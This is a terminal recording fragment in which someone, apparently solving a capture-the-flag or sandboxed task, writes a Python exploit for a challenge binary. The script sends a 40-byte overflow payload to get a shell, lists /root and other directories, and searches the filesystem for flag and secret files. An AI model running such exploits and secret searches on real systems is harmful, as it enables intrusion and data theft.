[699.110043, "i", "cat << 'EOF' > /app/exploit.py\nimport subprocess\nimport time\nimport sys\nimport os\nimport fcntl\n\np = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\ndef send(data):\n    p.stdin.write(data)\n    p.stdin.flush()\n    time.sleep(0.05)\n\nfor _ in range(9):\n    send(b'1\\n')\n    send(b'A\\n')\n\nsend(b'1\\n')\nsend(b'A' * 40 + b'\\x3b')\n\nsend(b'4\\n')\n\nsend(b'echo EXPLOIT_SUCCESS\\n')\nsend(b'ls -la /app /tmp / /root\\n')\nsend(b'find / -type f -name \"*flag*\" -o -name \"*secret*\" 2>/dev/null\\n')\n\ntime.sleep(1.0)\n\nfd = p.stdout.fileno()\nfl = fcntl.fcntl(fd, fcntl.F_GETFL)\nfcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)\n\ntry:\n    out = p.stdout.read()\n    if out:\n        sys.stdout.buffer.write(out)\nexcept Exception as e:\n    pass\nEOF\n"]
